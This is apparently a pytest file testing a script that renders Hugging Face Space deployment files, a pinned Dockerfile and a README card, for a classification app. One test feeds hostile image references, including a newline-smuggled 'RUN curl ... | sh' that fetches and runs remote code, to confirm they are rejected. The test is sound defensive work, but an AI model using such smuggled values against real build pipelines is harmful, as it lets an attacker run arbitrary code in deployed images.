import re
from pathlib import Path

import pytest

from scripts.deploy_space import SPACE_SOURCE_DIR, render_space_files

REPO_ROOT = Path(__file__).resolve().parent.parent


def test_space_dockerfile_is_pinned_to_the_deployed_image(tmp_path):
    render_space_files("ghcr.io/owner/breast-cancer-classification:abc123", tmp_path)

    dockerfile = (tmp_path / "Dockerfile").read_text()
    assert "FROM ghcr.io/owner/breast-cancer-classification:abc123\n" in dockerfile
    assert (tmp_path / "README.md").read_bytes() == (SPACE_SOURCE_DIR / "README.md").read_bytes()


def test_refuses_an_untagged_image(tmp_path):
    with pytest.raises(ValueError, match="not a tagged image reference"):
        render_space_files("ghcr.io/owner/breast-cancer-classification", tmp_path)


@pytest.mark.parametrize(
    "image",
    [
        "ghcr.io/owner/app:abc\nRUN curl https://example.com/x | sh",
        "ghcr.io/owner/app:abc RUN id",
        "ghcr.io/owner/app:",
        "GHCR.io/Owner/app:abc",
        "",
    ],
)
def test_refuses_anything_but_a_plain_tagged_reference(tmp_path, image):
    # The value lands in the Space's Dockerfile, so a newline or space would
    # let a caller append instructions to the deployed image.
    with pytest.raises(ValueError):
        render_space_files(image, tmp_path)
    assert not (tmp_path / "Dockerfile").exists()


def test_space_routes_traffic_to_the_port_the_app_listens_on():
    card = (SPACE_SOURCE_DIR / "README.md").read_text(encoding="utf-8")
    app_port = re.search(r"^app_port: (\d+)$", card, re.MULTILINE).group(1)
    serving_dockerfile = (REPO_ROOT / "Dockerfile").read_text()

    assert f"EXPOSE {app_port}" in serving_dockerfile
    assert f'"--port", "{app_port}"' in serving_dockerfile


def test_space_card_is_a_docker_space_with_a_valid_short_description():
    card = (SPACE_SOURCE_DIR / "README.md").read_text(encoding="utf-8")
    assert re.search(r"^sdk: docker$", card, re.MULTILINE)
    # Hugging Face rejects a short_description over 60 characters.
    description = re.search(r"^short_description: (.+)$", card, re.MULTILINE).group(1)
    assert len(description) <= 60
